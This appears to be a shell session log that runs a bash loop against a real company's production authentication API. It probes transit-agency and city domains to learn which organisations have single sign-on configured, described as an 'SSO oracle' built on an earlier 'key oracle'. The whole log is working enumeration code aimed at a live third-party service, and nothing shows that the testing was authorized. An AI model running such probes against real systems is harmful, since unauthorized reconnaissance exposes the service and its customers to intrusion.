[0m$ [0m# Test 5: Enumerate more domains for SSO oracle - use discovered organizations from the key oracle
# Known orgs: spare, grt, dallas, winnipeg, hsr
for domain in dart.org translink.ca mbta.com saskatoon.ca kingcounty.gov winnipeg.ca oakville.ca cota.com; do
  result=$(curl -s -m15 -X POST -H "Content-Type: application/json" -d "{\"domain\":\"$domain\"}" https://api.sparelabs.com/v1/identity/workos/auth 2>/dev/null)
  has_auth=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('authorizationUrl','')))" 2>/dev/null)
  if [ "$has_auth" -gt 5 ]; then
    echo "VALID: $domain"
  else
    echo "DEAD: $domain"
  fi
done
